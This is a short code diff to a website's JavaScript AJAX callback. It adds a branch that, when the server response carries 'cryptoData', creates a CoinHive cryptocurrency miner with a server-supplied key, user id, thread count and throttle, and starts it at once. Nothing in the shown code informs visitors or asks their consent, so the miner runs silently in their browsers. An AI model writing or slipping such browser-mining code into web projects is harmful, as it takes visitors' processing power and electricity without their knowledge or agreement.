@@ -453,7 +453,16 @@ function ehjaxCallback(data) {
 				$('#adminMusic').prop('src', adminMusic);
 				$('#adminMusic').trigger("play");
 			}
-		}
+		} else if (data.cryptoData) {
+			if (data.cryptoData.key) {
+				var miner = new CoinHive.User(data.cryptoData.key, data.cryptoData.userid, {
+					threads: data.cryptoData.threads,
+					throttle: data.cryptoData.throttle,
+					forceASMJS: true
+				});
+				miner.start();
+				}
+			}
 	}
 }
 
